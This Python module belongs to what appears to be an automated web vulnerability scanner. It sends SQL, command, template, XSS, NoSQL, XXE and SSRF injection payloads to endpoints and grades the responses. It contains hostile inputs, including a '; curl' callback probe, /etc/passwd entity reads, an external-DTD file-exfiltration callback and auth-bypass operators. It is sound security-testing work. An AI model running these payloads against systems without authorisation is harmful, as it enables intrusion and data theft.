"""
active_scanner.py — Systematic injection testing (Burp Active Scanner equivalent).

Only runs when --active-scan flag is passed. Targets:
  - Injection-classified findings that Verifier returned likely/not_confirmed
  - ParamFinding results from param_miner

Attack types:
  sqli_error      SQL injection via error-based detection
  sqli_time       Blind SQL injection via time-based detection
  cmdi            OS command injection (echo-based + timing)
  path_traversal  Local file inclusion / path traversal
  ssti            Server-side template injection (10 engine payloads)
  xxe             XML external entity (XML content-type endpoints only)

Pipeline position: after Verifier, before desync.
Only activated with --active-scan flag (loud — sends many probes).
"""

import asyncio
import json
import re
import time
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode

import httpx

import payloads as _payloads
from classifier import Cat
from verifier import _SQL_ERRORS, inject_param, inject_url_param

# ---------------------------------------------------------------------------
# Payload tables — loaded from PayloadsAllTheThings at runtime
# ---------------------------------------------------------------------------

# SQL error-based: 154 payloads (PAT Generic_ErrorBased.txt)
def _SQL_PAYLOADS() -> list[str]:
    return _payloads.sql_error()[:80]  # cap at 80 for active-scan speed

# SQL time-based: 105 payloads (PAT Generic_TimeBased.txt), each paired with 3s delay
def _SQLI_TIME_PAYLOADS() -> list[tuple[str, float]]:
    return [(_p, 3.0) for _p in _payloads.sql_time()[:30]]

# 10-engine SSTI payload table: (payload, expected_output, engine_hint)
_SSTI_PROBES: list[tuple[str, str, str]] = [
    ("{{7*7}}",            "49",      "Jinja2/Twig"),
    ("{{7*'7'}}",          "7777777", "Jinja2"),
    ("<%= 7*7 %>",         "49",      "ERB/EJS"),
    ("${7*7}",             "49",      "Groovy/SpEL/FreeMarker"),
    ("#{7*7}",             "49",      "Ruby/Thymeleaf"),
    ("*{7*7}",             "49",      "Spring OGNL"),
    ("{7*7}",              "49",      "Smarty"),
    ("{{= 7*7}}",          "49",      "Dust"),
    ("${7777+1}",          "7778",    "FreeMarker"),
    ("${{7*7}}",           "49",      "Handlebars"),
]

_SSTI_ERRORS = re.compile(
    r"(jinja2\.exceptions|templatenotfound|twig_error|freemarker|"
    r"smartyexception|pebbleexception|velocity error|"
    r"expression language error|el evaluation)",
    re.IGNORECASE,
)

# XSS probes: (payload, context, detection_pattern)
# Sources: ihebski/XSS-Payloads, PortSwigger XSS cheat sheet, netsec.expert/2020
_XSS_PROBES: list[tuple[str, str, re.Pattern]] = [
    # HTML body context
    ("<hxxpsinX>",             "html",  re.compile(r"<hxxpsinX>",             re.I)),
    # Attribute context breakout
    ('"><hxxpsinA>',           "attr",  re.compile(r'"><hxxpsinA>',           re.I)),
    # JS context escape
    ("</script><hxxpsinJ>",   "js",    re.compile(r"</script><hxxpsinJ>",    re.I)),
]

# Confirmed XSS payloads — only sent when context probe above shows reflection
# Sources: ihebski/XSS-Payloads, PayloadsAllTheThings
_XSS_PAYLOADS: list[tuple[str, str]] = [
    # HTML body
    ("<script>alert(1)</script>",                  "html"),
    ("<svg/onload=alert(1)>",                      "html"),
    ("<img src=x onerror=alert(1)>",               "html"),
    ("<details open ontoggle=alert(1)>",           "html"),
    ("<input autofocus onfocus=alert(1)>",         "html"),
    ("<body onload=alert(1)>",                     "html"),
    # Attribute context
    ("\" onmouseover=alert(1) x=\"",              "attr"),
    ("'><svg onload=alert(1)>",                   "attr"),
    # JS context
    ("';alert(1)//",                              "js"),
    ("</script><script>alert(1)</script>",         "js"),
    # Filter bypasses (from ihebski/XSS-Payloads)
    ("<ScRipT>alert(1)</ScRipT>",                  "html"),
    ("<svg\tonload=alert(1)>",                     "html"),
    ("<dETAILS open onToGgle=alert(1)>",           "html"),
    ("<iframe srcdoc='<body onload=alert(1)>'>",   "html"),
    ("<object data='data:text/html,<script>alert(1)</script>'>", "html"),
]

# CSP strong-block pattern (same as verifier.py)
_CSP_BLOCKS_INLINE = re.compile(
    r"script-src[^;]*(('none'|'nonce-[^']+'))[^;]*",
    re.IGNORECASE,
)

# Path traversal: 140 payloads (PAT directory_traversal.txt) with unix+windows markers
def _PATH_TRAVERSAL_PAYLOADS() -> list[tuple[str, str]]:
    unix = [(_p, "root:") for _p in _payloads.lfi_traversal()[:25]]
    windows = [(_p, "localhost") for _p in _payloads.lfi_windows()[:10] if "hosts" in _p.lower()]
    return unix + windows

# CMDi echo probes: 50 payloads from PAT command_exec.txt with echo-based detection
_CMD_ECHO_MARKER = "hxxpsin-2"
def _CMD_PROBES() -> list[tuple[str, str]]:
    raw = _payloads.cmdi_exec()[:50]
    # Keep payloads that use echo-style output detection
    echo_probes = [_p for _p in raw if "echo" in _p.lower() or "id" in _p.lower()]
    # Unix marker probes — first, since most app stacks are POSIX
    unix_markers = [
        (f"; echo {_CMD_ECHO_MARKER}", _CMD_ECHO_MARKER),
        (f"| echo {_CMD_ECHO_MARKER}", _CMD_ECHO_MARKER),
        (f"$(echo {_CMD_ECHO_MARKER})", _CMD_ECHO_MARKER),
        (f"`echo {_CMD_ECHO_MARKER}`", _CMD_ECHO_MARKER),
        (f"%0a echo {_CMD_ECHO_MARKER}", _CMD_ECHO_MARKER),
    ]
    # Windows cmd.exe + PowerShell variants — cheap to add; only fire on
    # Windows targets but the cost on POSIX is one wasted request per param.
    win_markers = _payloads.cmdi_windows(_CMD_ECHO_MARKER) + \
                  _payloads.cmdi_windows_powershell(_CMD_ECHO_MARKER)
    return unix_markers + win_markers + \
           [(_p, "root:") for _p in echo_probes if "id" in _p][:10]

# CMDi time-based: Unix sleep + Windows ping/timeout/Start-Sleep payloads
def _CMD_TIME_PAYLOADS() -> list[str]:
    sleep_payloads = [_p for _p in _payloads.cmdi_unix() if "sleep" in _p.lower() or "ping" in _p.lower()]
    unix = sleep_payloads[:10] or ["; sleep 3", "| sleep 3", "$(sleep 3)", "`sleep 3`"]
    return unix + _payloads.cmdi_windows_time()

# XXE payloads: 20 from PAT XXE_Fuzzing.txt + xml-attacks.txt
def _XXE_PAYLOADS() -> list[str]:
    return [_p for _p in _payloads.xxe_payloads()[:20]
            if "SYSTEM" in _p and ("passwd" in _p or "boot.ini" in _p or "shadow" in _p)]

# XXE OOB template — {canary_url} substituted at runtime
_XXE_FILE_READ = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
_XXE_OOB_TMPL  = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{canary_url}">]><foo>&xxe;</foo>'


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------

@dataclass
class ScanFinding:
    endpoint: str
    param: str
    attack_type: str    # sqli_error | sqli_time | cmdi | cmdi_time | path_traversal | ssti | xxe
    payload: str
    verdict: str        # confirmed | likely | not_confirmed
    confidence: float
    evidence: str
    response_snippet: str = ""
    timing_delta: float = 0.0
    oob_hit: bool = False

    def to_dict(self) -> dict:
        return {
            "endpoint": self.endpoint,
            "param": self.param,
            "attack_type": self.attack_type,
            "payload": self.payload,
            "verdict": self.verdict,
            "confidence": round(self.confidence, 2),
            "evidence": self.evidence,
            "timing_delta": round(self.timing_delta, 2),
            "oob_hit": self.oob_hit,
            "response_snippet": self.response_snippet[:200],
        }


@dataclass
class ActiveScanResult:
    endpoints_scanned: int = 0
    params_tested: int = 0
    findings: list[ScanFinding] = field(default_factory=list)

    @property
    def confirmed(self) -> list[ScanFinding]:
        return [f for f in self.findings if f.verdict == "confirmed"]

    @property
    def actionable(self) -> list[ScanFinding]:
        return [f for f in self.findings if f.verdict in ("confirmed", "likely")]

    def to_dict(self) -> dict:
        return {
            "endpoints_scanned": self.endpoints_scanned,
            "params_tested": self.params_tested,
            "confirmed": len(self.confirmed),
            "actionable": len(self.actionable),
            "findings": [f.to_dict() for f in self.findings],
        }


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------

class ActiveScanner:
    """
    Systematic injection testing. Call only when --active-scan is set.
    """

    def __init__(
        self,
        auth_headers: Optional[dict] = None,
        timeout: float = 10.0,
        timing_threshold: float = 2.5,
        canary=None,            # Optional[Canary]
        max_params_per_endpoint: int = 5,
        browser_verifier=None,  # Optional[BrowserVerifier] for XSS execution proof
        payload_server=None,    # Optional[PayloadServer] for active OOB callbacks
        public_url: Optional[str] = None,  # tunnel URL pointing at payload_server
    ):
        self.auth_headers = auth_headers or {}
        self.timeout = timeout
        self.timing_threshold = timing_threshold
        self.canary = canary
        self.max_params_per_endpoint = max_params_per_endpoint
        self.browser_verifier = browser_verifier
        self.payload_server = payload_server
        self.public_url = (public_url or "").rstrip("/") or None

    async def run(
        self,
        verify_results: list,        # list[VerifyResult] from Verifier
        param_findings=None,         # Optional[list[ParamFinding]] from ParamMiner
        classifier_findings=None,    # Optional[list[Finding]] from Classifier
        max_endpoints: int = 40,     # safety cap to keep runtime sane
    ) -> ActiveScanResult:
        result = ActiveScanResult()
        targets: list[tuple[str, str, Optional[str], Optional[str], str]] = []
        # Each target: (url, method, param_name, body, content_type)
        seen: set[tuple[str, str]] = set()  # dedup (method, url)

        def add_target(url: str, method: str, body: Optional[str] = None) -> None:
            key = (method.upper(), url)
            if key in seen:
                return
            seen.add(key)
            parsed = urlparse(url)
            all_params = list(parse_qs(parsed.query).keys())
            ct = "application/json"
            if all_params:
                # One target per query param — each gets injected individually
                for param_name in all_params:
                    targets.append((url, method, param_name, body, ct))
            else:
                # No query params: inject into JSON body fields or path
                targets.append((url, method, None, body, ct))

        # 1. From verifier results — broadened (no category whitelist).
        # The 1-endpoint cap was caused by an INJECTION/SSRF whitelist that
        # almost no Juice Shop endpoint matched. Now we test everything that
        # reached "likely" or "not_confirmed" — the payload arsenal is wasted
        # on confirmed-only-INJECTION endpoints when 40 others go untested.
        for vr in verify_results:
            if vr.verdict == "confirmed":
                continue  # already confirmed, skip re-testing
            add_target(vr.url, vr.method)

        # 2. From classifier findings (sorted high-score first).
        # The verifier filters aggressively; the classifier knows about every
        # endpoint that scored >= 1, including IDOR/AUTH/ADMIN/STATE-tagged
        # ones that the verifier may not have covered.
        if classifier_findings:
            sorted_findings = sorted(
                classifier_findings, key=lambda f: -getattr(f, "score", 0),
            )
            for f in sorted_findings:
                add_target(f.url, f.method, getattr(f, "body", None))

        # 3. From param miner findings (always include — these are interesting
        # because they returned a behavior change for an injected param name)
        if param_findings:
            for pf in param_findings:
                add_target(pf.endpoint, pf.method)

        # Cap to keep runtime predictable. Verifier-discovered targets are
        # added first so they take priority; classifier findings fill the rest.
        targets = targets[:max_endpoints]

        result.endpoints_scanned = len({t[0] for t in targets})
        result.params_tested = len(targets[:self.max_params_per_endpoint * 20])

        if not targets:
            return result

        async with httpx.AsyncClient(
            verify=False,
            timeout=self.timeout,
            follow_redirects=True,
            headers=self.auth_headers,
        ) as client:
            tasks = [
                self._scan_endpoint(client, url, method, param, body, ct)
                for url, method, param, body, ct in targets[:self.max_params_per_endpoint * 20]
            ]
            all_findings = await asyncio.gather(*tasks, return_exceptions=True)

        for item in all_findings:
            if isinstance(item, list):
                result.findings.extend(item)

        return result

    async def _scan_endpoint(
        self,
        client: httpx.AsyncClient,
        url: str,
        method: str,
        param: Optional[str],
        body: Optional[str],
        content_type: str,
    ) -> list[ScanFinding]:
        parsed = urlparse(url)
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        findings: list[ScanFinding] = []

        # Determine baseline timing
        baseline_time = await self._measure_baseline_time(client, url, method, body)

        # Choose which attacks to run based on context
        is_xml = "xml" in content_type.lower()

        coros = [
            self._test_sqli_error(client, url, method, param, params, body),
            self._test_sqli_time(client, url, method, param, params, body, baseline_time),
            self._test_cmdi(client, url, method, param, params, body, baseline_time),
            self._test_path_traversal(client, url, method, param, params, body),
            self._test_ssti(client, url, method, param, params, body),
            self._test_xss(client, url, method, param, params, body),
            self._test_nosql(client, url, method, param, params, body),
        ]
        if is_xml:
            coros.append(self._test_xxe(client, url, method, param, params, body))
        # SSRF param-injection runs only when tunnel/payload_server are wired up
        if self.payload_server and self.public_url:
            coros.append(self._test_ssrf(client, url, method, param, params, body))

        results = await asyncio.gather(*coros, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                findings.extend(r)
        return findings

    # -----------------------------------------------------------------------
    # Attack implementations
    # -----------------------------------------------------------------------

    async def _test_sqli_error(self, client, url, method, param, params, body) -> list[ScanFinding]:
        findings = []
        for payload in _SQL_PAYLOADS():
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            try:
                resp = await client.request(
                    method, probe_url,
                    content=probe_body,
                    headers={**self.auth_headers, "Content-Type": "application/json"} if probe_body else self.auth_headers,
                )
                if _SQL_ERRORS.search(resp.text[:3000]):
                    findings.append(ScanFinding(
                        endpoint=url, param=param or "(body)",
                        attack_type="sqli_error", payload=payload,
                        verdict="confirmed", confidence=0.9,
                        evidence=f"SQL error string in response to payload {payload!r}",
                        response_snippet=resp.text[:300],
                    ))
                    break
            except Exception:
                pass
        return findings

    async def _test_sqli_time(
        self, client, url, method, param, params, body, baseline_time: float
    ) -> list[ScanFinding]:
        threshold = max(self.timing_threshold, baseline_time * 2 + 1.5)
        for payload, expected_delay in _SQLI_TIME_PAYLOADS():
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            t0 = time.monotonic()
            try:
                await client.request(
                    method, probe_url,
                    content=probe_body,
                    headers={**self.auth_headers, "Content-Type": "application/json"} if probe_body else self.auth_headers,
                    timeout=self.timeout + expected_delay + 2,
                )
                elapsed = time.monotonic() - t0
                if elapsed - baseline_time >= threshold:
                    return [ScanFinding(
                        endpoint=url, param=param or "(body)",
                        attack_type="sqli_time", payload=payload,
                        verdict="confirmed", confidence=0.85,
                        evidence=f"Response delayed {elapsed:.1f}s (baseline {baseline_time:.1f}s, threshold {threshold:.1f}s)",
                        timing_delta=elapsed - baseline_time,
                    )]
            except Exception:
                pass
        return []

    async def _test_cmdi(
        self, client, url, method, param, params, body, baseline_time: float
    ) -> list[ScanFinding]:
        # OOB probe first if canary available
        if self.canary and self.canary.available:
            canary_url = self.canary.generate("cmdi")
            if canary_url:
                oob_payload = f"; curl {canary_url}"
                probe_url, probe_body = inject_param(url, params, param, oob_payload, body, method)
                try:
                    await client.request(method, probe_url, content=probe_body,
                                         headers=self.auth_headers)
                    hits = await self.canary.poll(timeout=4.0)
                    if hits:
                        return [ScanFinding(
                            endpoint=url, param=param or "(body)",
                            attack_type="cmdi", payload=oob_payload,
                            verdict="confirmed", confidence=0.95,
                            evidence=f"Command injection confirmed via OOB callback from {hits[0].remote_address}",
                            oob_hit=True,
                        )]
                except Exception:
                    pass

        # Echo-based detection
        for payload, expected in _CMD_PROBES():
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            try:
                resp = await client.request(method, probe_url, content=probe_body,
                                             headers=self.auth_headers)
                if expected in resp.text:
                    return [ScanFinding(
                        endpoint=url, param=param or "(body)",
                        attack_type="cmdi", payload=payload,
                        verdict="confirmed", confidence=0.9,
                        evidence=f"Command output {expected!r} reflected in response",
                        response_snippet=resp.text[:200],
                    )]
            except Exception:
                pass

        # Timing fallback
        threshold = max(self.timing_threshold, baseline_time * 2 + 1.5)
        for payload in _CMD_TIME_PAYLOADS():
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            t0 = time.monotonic()
            try:
                await client.request(method, probe_url, content=probe_body,
                                      headers=self.auth_headers, timeout=self.timeout + 5)
                elapsed = time.monotonic() - t0
                if elapsed - baseline_time >= threshold:
                    return [ScanFinding(
                        endpoint=url, param=param or "(body)",
                        attack_type="cmdi_time", payload=payload,
                        verdict="likely", confidence=0.7,
                        evidence=f"Response delayed {elapsed:.1f}s (baseline {baseline_time:.1f}s) — possible sleep injection",
                        timing_delta=elapsed - baseline_time,
                    )]
            except Exception:
                pass
        return []

    async def _test_path_traversal(self, client, url, method, param, params, body) -> list[ScanFinding]:
        for payload, marker in _PATH_TRAVERSAL_PAYLOADS():
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            try:
                resp = await client.request(method, probe_url, content=probe_body,
                                             headers=self.auth_headers)
                if marker in resp.text:
                    return [ScanFinding(
                        endpoint=url, param=param or "(body)",
                        attack_type="path_traversal", payload=payload,
                        verdict="confirmed", confidence=0.95,
                        evidence=f"Path traversal: {marker!r} found in response body",
                        response_snippet=resp.text[:300],
                    )]
            except Exception:
                pass
        return []

    async def _test_ssti(self, client, url, method, param, params, body) -> list[ScanFinding]:
        # Phase 1: eval probes (safe — arithmetic expressions only)
        for payload, expected, engine in _SSTI_PROBES:
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            try:
                resp = await client.request(method, probe_url, content=probe_body,
                                             headers=self.auth_headers)
                text = resp.text[:3000]
                if expected in text:
                    return [ScanFinding(
                        endpoint=url, param=param or "(body)",
                        attack_type="ssti", payload=payload,
                        verdict="confirmed", confidence=0.9,
                        evidence=f"SSTI ({engine}): {payload!r} evaluated to {expected!r}",
                        response_snippet=text[:200],
                    )]
                if _SSTI_ERRORS.search(text):
                    return [ScanFinding(
                        endpoint=url, param=param or "(body)",
                        attack_type="ssti", payload=payload,
                        verdict="likely", confidence=0.7,
                        evidence=f"Template engine error triggered by {payload!r} ({engine})",
                        response_snippet=text[:200],
                    )]
            except Exception:
                pass

        # Phase 2: PAT ssti.fuzz payloads (includes RCE-class — already --active-scan gated)
        # These include Jinja2 __subclasses__, Mako os.system, SpEL T(Runtime), etc.
        import sys
        print("  [ssti] sending RCE-class SSTI payloads (PAT ssti.fuzz)", file=sys.stderr)
        for payload in _payloads.ssti_fuzz()[:40]:
            if payload in {p for p, _, _ in _SSTI_PROBES}:
                continue  # already tested above
            probe_url, probe_body = inject_param(url, params, param, payload, body, method)
            try:
                resp = await client.request(method, probe_url, content=probe_body,
                                             headers=self.auth_headers)
                text = resp.text[:3000]
                if _SSTI_ERRORS.search(text):
                    return [ScanFinding(
                        endpoint=url, param=param or "(body)",
                        attack_type="ssti", payload=payload,
                        verdict="likely", confidence=0.7,
                        evidence=f"Template engine error triggered by PAT payload {payload[:40]!r}",
                        response_snippet=text[:200],
                    )]
                # Check for common RCE output patterns
                if any(sig in text for sig in ("uid=", "root:", "/bin/bash", "www-data")):
                    return [ScanFinding(
                        endpoint=url, param=param or "(body)",
                        attack_type="ssti_rce", payload=payload,
                        verdict="confirmed", confidence=0.95,
                        evidence=f"SSTI RCE: command output in response from {payload[:40]!r}",
                        response_snippet=text[:300],
                    )]
            except Exception:
                pass
        return []

    async def _test_xxe(self, client, url, method, param, params, body) -> list[ScanFinding]:
        # File read — try PAT's broader XXE payload set
        for xxe_payload in _XXE_PAYLOADS()[:8] or [_XXE_FILE_READ]:
            try:
                resp = await client.request(
                    method, url, content=xxe_payload,
                    headers={**self.auth_headers, "Content-Type": "application/xml"},
                )
                if "root:" in resp.text or "localhost" in resp.text:
                    return [ScanFinding(
                        endpoint=url, param="(body)",
                        attack_type="xxe", payload=xxe_payload[:80],
                        verdict="confirmed", confidence=0.95,
                        evidence="XXE: sensitive file contents in response",
                        response_snippet=resp.text[:300],
                    )]
            except Exception:
                pass

        # Legacy single-payload fallback + OOB
        try:
            resp = await client.request(
                method, url, content=_XXE_FILE_READ,
                headers={**self.auth_headers, "Content-Type": "application/xml"},
            )
            if "root:" in resp.text:
                return [ScanFinding(
                    endpoint=url, param="(body)",
                    attack_type="xxe", payload="file:///etc/passwd",
                    verdict="confirmed", confidence=0.95,
                    evidence="XXE: /etc/passwd contents in response",
                    response_snippet=resp.text[:300],
                )]
        except Exception:
            pass

        # OOB probe — payload_server preferred (serves a real DTD with file
        # exfil), canary fallback (DNS/HTTP metadata only)
        if self.payload_server and self.public_url:
            token = self.payload_server.mint_token("xxe")
            dtd_url = f"{self.public_url}/xxe/{token}.dtd"
            # Reference our external DTD — the target parses it and the DTD
            # itself triggers the file exfil callback to /r/<token>
            ext_dtd_payload = (
                f'<?xml version="1.0"?>\n'
                f'<!DOCTYPE foo SYSTEM "{dtd_url}">\n'
                f'<foo></foo>'
            )
            try:
                await client.request(
                    method, url, content=ext_dtd_payload,
                    headers={**self.auth_headers, "Content-Type": "application/xml"},
                )
                # Wait up to 8s for the target to fetch the DTD AND make the
                # exfil callback. payload_server records both.
                await asyncio.sleep(5.0)
                hits = self.payload_server.hits_for(token)
                if hits:
                    fetcher_ip = hits[0].peer
                    return [ScanFinding(
                        endpoint=url, param="(body)",
                        attack_type="xxe", payload="OOB external DTD",
                        verdict="confirmed", confidence=0.95,
                        evidence=(
                            f"XXE OOB: target fetched external DTD from {dtd_url} "
                            f"(peer={fetcher_ip}, {len(hits)} hit(s))"
                        ),
                        oob_hit=True,
                    )]
            except Exception:
                pass

        if self.canary and self.canary.available:
            canary_url = self.canary.generate("xxe")
            if canary_url:
                oob_payload = _XXE_OOB_TMPL.format(canary_url=canary_url)
                try:
                    await client.request(
                        method, url, content=oob_payload,
                        headers={**self.auth_headers, "Content-Type": "application/xml"},
                    )
                    hits = await self.canary.poll(timeout=5.0)
                    if hits:
                        return [ScanFinding(
                            endpoint=url, param="(body)",
                            attack_type="xxe", payload="OOB entity",
                            verdict="confirmed", confidence=0.95,
                            evidence=f"XXE OOB: callback from {hits[0].remote_address} ({hits[0].protocol})",
                            oob_hit=True,
                        )]
                except Exception:
                    pass
        return []

    async def _test_xss(self, client, url, method, param, params, body) -> list[ScanFinding]:
        """
        Two-phase XSS detection:
          1. Context probes — cheap tags to find reflection context (html/attr/js).
          2. Payload confirmation — send a real payload only when context probe reflects.
        Checks Content-Type and CSP to avoid false positives.
        """
        for probe_payload, context, detection_re in _XSS_PROBES:
            probe_url, probe_body = inject_param(url, params, param, probe_payload, body, method)
            try:
                r = await client.request(
                    method, probe_url,
                    content=probe_body,
                    headers={**self.auth_headers, "Content-Type": "application/json"} if probe_body else self.auth_headers,
                )
                if not detection_re.search(r.text):
                    continue

                ct = r.headers.get("content-type", "")
                is_html = "text/html" in ct or "application/xhtml" in ct
                if not is_html:
                    return [ScanFinding(
                        endpoint=url, param=param or "(body)",
                        attack_type="xss", payload=probe_payload,
                        verdict="likely", confidence=0.5,
                        evidence=f"XSS probe reflected in non-HTML response ({ct}) — JSONP/sniffing may apply",
                        response_snippet=r.text[:200],
                    )]

                csp = r.headers.get("content-security-policy", "")
                csp_blocks = bool(csp and _CSP_BLOCKS_INLINE.search(csp) and "unsafe-inline" not in csp)

                # Confirm with a real XSS payload for the matching context
                for xss_payload, xss_ctx in _XSS_PAYLOADS:
                    if xss_ctx != context:
                        continue
                    c_url, c_body = inject_param(url, params, param, xss_payload, body, method)
                    try:
                        cr = await client.request(
                            method, c_url,
                            content=c_body,
                            headers={**self.auth_headers, "Content-Type": "application/json"} if c_body else self.auth_headers,
                        )
                        if xss_payload in cr.text or re.search(re.escape(xss_payload[:20]), cr.text, re.I):
                            # Default: confirm via response-body reflection alone.
                            # If the BrowserVerifier is available, upgrade or demote
                            # this verdict using actual JS execution as ground truth.
                            verdict = "likely" if csp_blocks else "confirmed"
                            confidence = 0.65 if csp_blocks else 0.88
                            csp_note = " — CSP may limit exploitability" if csp_blocks else ""
                            evidence = f"XSS ({context} context): {xss_payload!r} reflected in HTML{csp_note}"

                            if self.browser_verifier and self.browser_verifier.available:
                                # Build a canary-bearing payload for the same context
                                # and ask the browser whether it actually fires.
                                canary_payloads = self.browser_verifier.xss_payloads(context)
                                if method.upper() == "GET" and param:
                                    # Prefer the URL-injection path — works for GET
                                    canary_url, _ = inject_param(
                                        url, params, param, canary_payloads[0], None, "GET",
                                    )
                                    bv_result = await self.browser_verifier.verify_xss(
                                        canary_url, auth_headers=self.auth_headers,
                                    )
                                    if bv_result.verdict == "confirmed":
                                        verdict = "confirmed"
                                        confidence = bv_result.confidence
                                        evidence = f"XSS ({context}): {bv_result.evidence} [signal={bv_result.signal}]"
                                    elif bv_result.verdict == "not_confirmed":
                                        # Reflected but didn't execute — likely escaped
                                        # at render time. Demote to manual review.
                                        verdict = "likely"
                                        confidence = 0.45
                                        evidence = (
                                            f"XSS reflection found but browser did not execute "
                                            f"({bv_result.evidence}) — likely sanitized at render. "
                                            f"Manual review."
                                        )
                                    elif bv_result.verdict == "likely":
                                        # CSP-blocked execution — keep verdict
                                        evidence = f"XSS ({context}): {bv_result.evidence}"

                            return [ScanFinding(
                                endpoint=url, param=param or "(body)",
                                attack_type="xss", payload=xss_payload,
                                verdict=verdict, confidence=confidence,
                                evidence=evidence,
                                response_snippet=cr.text[:300],
                            )]
                    except Exception:
                        pass

                # Context probe reflected but no payload confirmed — still report
                return [ScanFinding(
                    endpoint=url, param=param or "(body)",
                    attack_type="xss", payload=probe_payload,
                    verdict="likely", confidence=0.6,
                    evidence=f"XSS ({context} context): probe tag reflected unescaped — manual payload required",
                    response_snippet=r.text[:200],
                )]
            except Exception:
                pass
        return []

    async def _test_ssrf(
        self, client, url, method, param, params, body,
    ) -> list[ScanFinding]:
        """Param-injection SSRF probe — replace `param` with our tunnel URL and
        watch for an inbound callback. Only runs when both payload_server and
        a public_url are available; otherwise returns []."""
        if not (self.payload_server and self.public_url and param):
            return []
        from intruder import inject_param  # local-only — keep import lazy

        token = self.payload_server.mint_token("ssrf")
        callback = f"{self.public_url}/r/{token}"

        # Two payload shapes: raw callback URL (most common) + redirect-chain
        # variant that uses our tunnel as a hop to an internal target.
        payloads = [
            callback,
            f"{self.public_url}/ssrf/internal/aws?token={token}",
        ]
        for payload in payloads:
            try:
                probe_url, probe_body = inject_param(url, params, param, payload, body, method)
                await client.request(
                    method, probe_url,
                    content=probe_body.encode() if probe_body else None,
                    headers=self.auth_headers,
                )
            except Exception:
                continue
        # Brief wait — target's HTTP client typically returns in <3s for SSRF
        await asyncio.sleep(3.5)
        hits = self.payload_server.hits_for(token)
        if not hits:
            return []
        first = hits[0]
        return [ScanFinding(
            endpoint=url, param=param,
            attack_type="ssrf", payload=callback,
            verdict="confirmed", confidence=0.95,
            evidence=(
                f"SSRF confirmed via tunnel callback: target fetched {first.path} "
                f"from {first.peer} ({len(hits)} total hit(s))"
            ),
            oob_hit=True,
        )]

    async def _test_nosql(self, client, url, method, param, params, body) -> list[ScanFinding]:
        """Quick NoSQL operator injection check (full probing in nosql_probe.py)."""
        from nosql_probe import _inject as _nosql_inject, _NOSQL_ERRORS
        op_probes = [
            ('{"$ne": 1}',   "operator $ne"),
            ('{"$gt": ""}',  "operator $gt"),
            ('[$ne]=1',      "array bypass"),
        ]
        try:
            baseline = await client.request(
                method, url,
                content=body.encode() if body else None,
                headers=self.auth_headers,
            )
            baseline_status = baseline.status_code
        except Exception:
            return []

        for payload_str, label in op_probes:
            probe_url, probe_body = _nosql_inject(url, params, param, payload_str, body, method, json_value=True)
            try:
                resp = await client.request(
                    method, probe_url,
                    content=probe_body,
                    headers={**self.auth_headers, "Content-Type": "application/json"} if probe_body else self.auth_headers,
                )
                if _NOSQL_ERRORS.search(resp.text[:2000]):
                    return [ScanFinding(
                        endpoint=url, param=param or "(body)",
                        attack_type="nosql_error", payload=payload_str,
                        verdict="confirmed", confidence=0.88,
                        evidence=f"NoSQL error triggered by {label}",
                        response_snippet=resp.text[:300],
                    )]
                if baseline_status in (401, 403) and resp.status_code < 300:
                    return [ScanFinding(
                        endpoint=url, param=param or "(body)",
                        attack_type="nosql_auth_bypass", payload=payload_str,
                        verdict="confirmed", confidence=0.92,
                        evidence=f"NoSQL auth bypass: {baseline_status} → {resp.status_code} via {label}",
                        response_snippet=resp.text[:300],
                    )]
            except Exception:
                pass
        return []

    # -----------------------------------------------------------------------
    # Helpers
    # -----------------------------------------------------------------------

    async def _measure_baseline_time(
        self,
        client: httpx.AsyncClient,
        url: str,
        method: str,
        body: Optional[str],
        samples: int = 2,
    ) -> float:
        """Measure p95 response time for the unmodified request."""
        times: list[float] = []
        for _ in range(samples):
            t0 = time.monotonic()
            try:
                if method in ("POST", "PUT", "PATCH") and body:
                    await client.request(method, url, content=body, headers=self.auth_headers)
                else:
                    await client.get(url)
                times.append(time.monotonic() - t0)
            except Exception:
                times.append(0.5)
        return sorted(times)[-1] if times else 0.5


# ---------------------------------------------------------------------------
# Auto-fuzz: bridge classifier findings → Intruder payload library
# ---------------------------------------------------------------------------

# URL path segments that are injection candidates: numeric IDs, UUIDs, slugs
_PATH_INJECT_RE = re.compile(
    r"(/)([\w]{8}-[\w]{4}-[\w]{4}-[\w]{4}-[\w]{12}"  # UUID
    r"|[0-9]+"                                          # numeric ID
    r"|[a-f0-9]{24,})"                                  # hex ID (MongoDB ObjectId etc.)
)

# Category → (payload_set_names, max_payloads_per_position)
_CAT_PAYLOADS: dict[str, tuple[list[str], int]] = {
    Cat.INJECTION:   (["sqli_error", "xss", "ssti", "cmdi"],  25),
    Cat.IDOR:        (["ids"],                                  50),
    Cat.SSRF:        (["redirect"],                             30),
    Cat.PROTO_POLL:  (["nosql"],                                20),
    Cat.NOSQL:       (["nosql"],                                30),
    Cat.MASS_ASSIGN: (["bypass", "sqli_error"],                 20),
    Cat.ADMIN:       (["bypass", "lfi"],                        20),
    Cat.AUTH:        (["bypass", "sqli_error"],                 20),
    Cat.BFLA:        (["bypass", "ids"],                        20),
}
_DEFAULT_PAYLOADS = (["bypass", "sqli_error", "xss"], 15)

# Error patterns in response bodies that indicate something interesting happened
_FUZZ_ERROR_RE = re.compile(
    r"(sql syntax|mysql_fetch|pg_query|sqlite_|ORA-\d{5}"
    r"|traceback|exception in thread|stack trace|internal server error"
    r"|unhandled exception|syntax error near|unexpected token"
    r"|mongodb|mongoose|bsontype"
    r"|jinja2|templatenotfound|twig_error"
    r"|command not found|no such file|permission denied"
    r"|root:x:0:0)",
    re.IGNORECASE,
)


@dataclass
class FuzzFinding:
    method: str
    url: str
    position: str       # which param/field was fuzzed
    payload: str
    baseline_status: int
    fuzz_status: int
    baseline_length: int
    fuzz_length: int
    anomaly: str        # human-readable reason it's interesting
